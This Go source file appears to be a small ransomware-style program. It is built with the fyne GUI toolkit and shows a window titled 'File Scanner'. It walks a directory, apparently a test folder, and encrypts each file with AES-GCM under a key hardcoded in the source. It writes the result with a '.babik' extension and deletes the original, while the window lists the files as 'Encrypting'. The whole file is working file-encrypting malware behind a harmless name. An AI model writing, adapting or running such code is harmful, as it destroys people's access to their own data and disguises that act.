package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

var FILES []string
var KEY []byte = []byte("thisisthesecretkeythatwillbeused")
var LOCATION string = "/home/catur/Testing"
var EXTENSION string = ".babik"

func encrypt(path string, gcm cipher.AEAD) {
	original, _ := os.ReadFile(path)

	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	encrypted := gcm.Seal(nonce, nonce, original, nil)

	var err = os.WriteFile(path+EXTENSION, encrypted, 0666)
	if err == nil {
		os.Remove(path)
	} else {
		fmt.Println("error while writing contents")
	}
}

func searchFile(w fyne.Window, gcm cipher.AEAD, fileCountLabel *widget.Label) {
	filepath.Walk(LOCATION, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			// fileExt := path[len(path)-6:]
			fileExt := filepath.Ext(path)

			if err == nil && fileExt != EXTENSION {
				FILES = append([]string{"Encrypting " + path}, FILES...)
				fileCountLabel.SetText(fmt.Sprintf("Files count: %d file(s)", len(FILES)))
				w.Content().Refresh()
				encrypt(path, gcm)
			} else {
				fmt.Println("error while reading file contents")
			}
		}
		return nil
	})
}

func main() {
	block, err := aes.NewCipher(KEY)
	if err != nil {
		panic("error while setting up aes")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm")
	}
	fileCountLabel := widget.NewLabel("Files count: 0 file(s)")

	a := app.New()
	w := a.NewWindow("File Scanner")

	list := widget.NewList(
		func() int {
			return len(FILES)
		},
		func() fyne.CanvasObject {
			return widget.NewLabel("")
		},
		func(lii widget.ListItemID, co fyne.CanvasObject) {
			co.(*widget.Label).SetText(FILES[lii])
		},
	)

	vScroll := container.NewVScroll(list)
	vScroll.SetMinSize(fyne.NewSize(700, 300))

	w.SetContent(container.NewVBox(
		vScroll,
		fileCountLabel,
	))
	w.CenterOnScreen()

	searchFile(w, gcm, fileCountLabel)

	w.SetOnClosed(func() {
		w.Content().Refresh()
	})

	w.ShowAndRun()
}
